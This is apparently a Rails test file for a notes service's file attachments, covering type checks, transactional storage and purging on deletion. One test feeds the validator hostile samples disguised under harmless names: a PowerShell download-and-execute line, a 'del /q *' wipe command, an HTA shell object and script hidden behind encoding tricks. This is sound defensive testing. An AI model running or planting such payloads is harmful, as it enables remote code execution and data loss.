require "test_helper"
require "support/note_files_helper"

# Files on a note through the services (notes spec D9, D14, §3.6): written
# with the message, removed with it, and removed with whatever the note was
# on -- the rows in the transaction, the stored bytes only after it commits.
class Notes::FilesServiceTest < ActiveSupport::TestCase
  include NoteFilesHelper
  include ActiveJob::TestHelper

  setup { @page = create_page(title: "Pricing", published: false) }

  def png = fixture_upload("tiny.png", name: "shot.png", declared: "text/plain")

  def svg = fixture_upload("tiny.svg", name: "logo.png", declared: "image/png")

  def pdf = note_upload(PDF, "report.pdf", "application/pdf")

  def note_attachments = ActiveStorage::Attachment.where(record_type: "Notes::Message")

  # No attachment row, no blob row and no stored file of a note.
  def assert_no_note_files(keys)
    assert_equal [ 0, 0 ], [ note_attachments.count, note_blobs.count ]
    assert_empty keys.select { |key| stored?(key) }
  end

  test "a note is started with a file, stored under the type its bytes are, and the log holds no file name" do
    result = as(users(:two)) { Notes::Start.call(@page, body: "See the screenshot", files: [ png ]) }

    assert result.ok?, result.errors.to_sentence
    file = result.record.first_message.files.sole
    assert_equal [ "shot.png", "image/png", "notes" ], [ file.filename.to_s, file.content_type, file.blob.service_name ]
    assert stored?(file.key)
    assert_equal file_fixture("tiny.png").binread, file.download
    assert_no_match(/shot\.png|tiny/, Audit::Event.order(:id).last.attributes.to_json) # ("snapshot" holds "shot")
  end

  # Nothing parses a note's file: no analyzer runs on it, no job is queued for it.
  test "a file is stored as it came: no job analyzes it" do
    assert_no_enqueued_jobs do
      as(users(:two)) { Notes::Start.call(@page, body: "See the screenshot", files: [ png, pdf ]) }
    end
  end

  test "a refused file fails the whole note: nothing is saved, nothing is stored, nobody is told" do
    assert_no_difference [ -> { Notes::Thread.count }, -> { ActiveStorage::Blob.count }, -> { Notes::Delivery.count }, -> { Audit::Event.count } ] do
      result = as(users(:two)) { Notes::Start.call(@page, body: "For @[#{users(:reader).id}]", files: [ png, svg ]) }
      assert_equal [ "logo.png: this type of file can't be attached." ], result.errors
    end
  end

  # The ruling after the first review: the stored type and the name a person
  # downloads the file under must agree, markup behind a byte order mark is
  # markup, and UTF-16 is not UTF-8. Each with real bytes, through the service.
  test "a file whose name and bytes disagree refuses the note, and nothing is stored" do
    mark = "\xEF\xBB\xBF".b
    files = {
      "page.txt" => mark + HTML.b, "drawing.txt" => mark + file_fixture("tiny.svg").binread,
      "utf16.txt" => "\xFF\xFE".b + "<html><script>alert(1)</script></html>".encode("UTF-16LE").b,
      "run.hta" => "<script>new ActiveXObject('WScript.Shell')</script>", "setup.ps1" => "Invoke-WebRequest https://example.com | iex\n",
      "start.cmd" => "del /q *\r\n", "report.docm" => office_bytes("docx"), "shot.txt" => file_fixture("tiny.png").binread, "notes.pdf" => "Just text.\n"
    }

    files.each do |name, bytes|
      assert_no_difference [ -> { Notes::Thread.count }, -> { Notes::Message.count }, -> { ActiveStorage::Blob.count }, -> { ActiveStorage::Attachment.count } ], name do
        result = as(users(:two)) { Notes::Start.call(@page, body: "With #{name}", files: [ png, note_upload(bytes, name) ]) }
        assert_match(/\A#{Regexp.escape(name)}: /, result.errors.sole, name)
      end
    end
  end

  # A save behind `attach` that fails is an ordinary refusal: the note and
  # the files attached before it go with the transaction.
  test "a file that cannot be written fails the note whole, with a sentence" do
    calls = 0
    failing = lambda do |message, uploads|
      Array(uploads).all? do |upload|
        (calls += 1) == 1 && message.files.attach(io: upload.tempfile, filename: "first.png", content_type: "image/png", identify: false)
      end
    end
    thread = as(users(:two)) { Notes::Start.call(@page, body: "Start") }.record

    with_singleton_override(Notes::Files, :attach, failing) do
      assert_no_difference [ -> { Notes::Thread.count }, -> { Notes::Message.count }, -> { ActiveStorage::Blob.count }, -> { Audit::Event.count }, -> { Notes::Delivery.count } ] do
        started = as(users(:two)) { Notes::Start.call(@page, body: "For @[#{users(:reader).id}]", files: [ png, pdf ]) }
        assert_equal [ "The files could not be stored. Nothing was saved: try again." ], started.errors
        calls = 0
        replied = as(users(:reader)) { Notes::Reply.call(thread, body: "A reply", files: [ png, pdf ]) }
        assert_equal [ "The files could not be stored. Nothing was saved: try again." ], replied.errors
      end
    end
  end

  test "a long name is stored at 255 characters with its ending" do
    result = as(users(:two)) { Notes::Start.call(@page, body: "Long", files: [ fixture_upload("tiny.png", name: "#{"n" * 150}.png").tap { |upload| upload.define_singleton_method(:original_filename) { "#{"n" * 400}.png" } } ]) }

    assert result.ok?, result.errors.to_sentence
    assert_equal "#{"n" * 251}.png", result.record.first_message.files.sole.filename.to_s
  end

  test "what the text gets wrong and what a file gets wrong are both said" do
    result = as(users(:two)) { Notes::Start.call(@page, body: "", files: [ svg ]) }

    assert_equal [ "Write something first.", "logo.png: this type of file can't be attached." ], result.errors
  end

  # The rows are written in the note's transaction and the bytes when it
  # commits: a rollback leaves neither.
  test "a note that is rolled back stores no file" do
    key = nil

    ActiveRecord::Base.transaction do
      thread = as(users(:two)) { Notes::Start.call(@page, body: "Rolled back", files: [ png ]) }.record
      key = thread.first_message.files.sole.key
      raise ActiveRecord::Rollback
    end

    assert_equal 0, note_blobs.count
    assert_not stored?(key)
  end

  test "a reply carries files too, and deleting the message deletes them from the tables and from storage" do
    thread = as(users(:two)) { Notes::Start.call(@page, body: "Start") }.record
    reply = as(users(:reader)) { Notes::Reply.call(thread, body: "Here", files: [ png, pdf ]) }.record
    assert_equal 2, reply.files.count
    keys = note_file_keys
    assert(keys.all? { |key| stored?(key) })

    assert_no_enqueued_jobs { assert as(users(:reader)) { Notes::DeleteMessage.call(reply) }.ok? }

    assert_no_note_files(keys)
    assert_equal 1, thread.reload.messages.count
  end

  test "a thread that goes with its last message leaves no file" do
    thread = as(users(:two)) { Notes::Start.call(@page, body: "Only one", files: [ png ]) }.record
    keys = note_file_keys

    assert as(users(:two)) { Notes::DeleteMessage.call(thread.first_message) }.ok?

    assert_equal 0, Notes::Thread.count
    assert_no_note_files(keys)
  end

  test "a delete that is rolled back keeps the file" do
    thread = as(users(:two)) { Notes::Start.call(@page, body: "Kept", files: [ png ]) }.record
    keys = note_file_keys

    ActiveRecord::Base.transaction do
      assert as(users(:two)) { Notes::DeleteMessage.call(thread.first_message) }.ok?
      raise ActiveRecord::Rollback
    end

    assert_equal [ 1, 1 ], [ note_attachments.count, note_blobs.count ]
    assert stored?(keys.sole)
  end

  test "an edit changes the text and leaves the files as they are" do
    thread = as(users(:two)) { Notes::Start.call(@page, body: "Before", files: [ png ]) }.record

    assert as(users(:two)) { Notes::EditMessage.call(thread.first_message, body: "After") }.ok?

    assert_equal [ "shot.png" ], thread.first_message.reload.files.map { |file| file.filename.to_s }
  end

  # The services take any actor (there is no MCP tool for notes): a token is
  # judged as for a note without files, and a refusal stores nothing.
  test "a token's note carries files like a person's, and a refused token stores nothing" do
    token = ApiToken.generate!(users(:one), group: access_control_groups(:admin)).first
    result = as(token, channel: :mcp) { Notes::Start.call(@page, body: "From a token", files: [ png ]) }
    assert result.ok?, result.errors.to_sentence
    assert_equal 1, result.record.first_message.files.count

    nobody = User.create!(email_address: "nobody@example.com", password: "a-long-enough-password")
    stranger = ApiToken.generate!(nobody, group: access_control_groups(:admin)).first
    assert_no_difference [ -> { Notes::Thread.count }, -> { ActiveStorage::Blob.count } ] do
      assert_predicate as(stranger, channel: :mcp) { Notes::Start.call(@page, body: "Refused", files: [ png ]) }, :denied?
    end
  end

  # --- removed with what the note was on (`Notes::Remove`) -----------------------

  test "purging a page with noted blocks leaves no file of its notes" do
    block = @page.content_blocks.create!(block_type: "rich_text", position: 0)
    as(users(:two)) do
      Notes::Start.call(@page, body: "On the page", files: [ png ])
      thread = Notes::Start.call(block, body: "On the block", files: [ png, pdf ]).record
      Notes::Reply.call(thread, body: "And a reply", files: [ pdf ])
    end
    keys = note_file_keys
    assert_equal 4, keys.count { |key| stored?(key) }
    assert Trash::Move.call(@page).ok?

    assert_no_enqueued_jobs(only: ActiveStorage::PurgeJob) { assert Trash::Purge.call(@page.reload).ok? }

    assert_no_note_files(keys)
  end

  test "purging a post and purging an image leave no file of their notes" do
    [ create_post(title: "Noted", published: false), create_media_asset ].each do |record|
      as(users(:two)) { Notes::Start.call(record, body: "A note", files: [ png, pdf ]) }
      keys = note_file_keys
      assert Trash::Move.call(record).ok?

      assert Trash::Purge.call(record.reload).ok?

      assert_no_note_files(keys)
    end
  end

  test "deleting a block leaves no file of its notes, and keeps those of the page's own" do
    block = @page.content_blocks.create!(block_type: "rich_text", position: 0)
    as(users(:two)) { Notes::Start.call(@page, body: "On the page", files: [ png ]) }
    kept = note_file_keys
    as(users(:two)) { Notes::Start.call(block, body: "On the block", files: [ png, pdf ]) }
    gone = note_file_keys - kept

    assert ContentBlocks::Destroy.call(block, actor: nil).ok?

    assert_empty gone.select { |key| stored?(key) }
    assert_equal [ 1, 1 ], [ note_attachments.count, note_blobs.count ]
    assert stored?(kept.sole)
  end

  test "a purge that is rolled back leaves every file in storage, and its rows" do
    as(users(:two)) { Notes::Start.call(@page, body: "On the page", files: [ png, pdf ]) }
    keys = note_file_keys
    assert Trash::Move.call(@page).ok?

    ActiveRecord::Base.transaction do
      assert Trash::Purge.call(@page.reload).ok?
      assert_equal 0, note_blobs.count # gone inside the transaction
      assert(keys.all? { |key| stored?(key) }) # the bytes wait for the commit
      raise ActiveRecord::Rollback
    end

    assert_equal [ 2, 2 ], [ note_attachments.count, note_blobs.count ]
    assert(keys.all? { |key| stored?(key) })
    assert_equal PDF, Notes::Message.sole.files.find { |file| file.filename.to_s == "report.pdf" }.download
  end

  # A storage that fails after the commit is not the delete's failure.
  test "a file that can't be erased is reported and does not fail the delete" do
    thread = as(users(:two)) { Notes::Start.call(@page, body: "Only one", files: [ png ]) }.record
    note_file_keys
    reported = []
    subscriber = Object.new
    subscriber.define_singleton_method(:report) { |error, **| reported << error.class }
    Rails.error.subscribe(subscriber)

    with_singleton_override(note_service, :delete, ->(_key) { raise Errno::EACCES }) do
      assert as(users(:two)) { Notes::DeleteMessage.call(thread.first_message) }.ok?
    end

    assert_equal [ Errno::EACCES ], reported
    assert_equal 0, note_blobs.count
  ensure
    Rails.error.unsubscribe(subscriber) if subscriber
  end
end
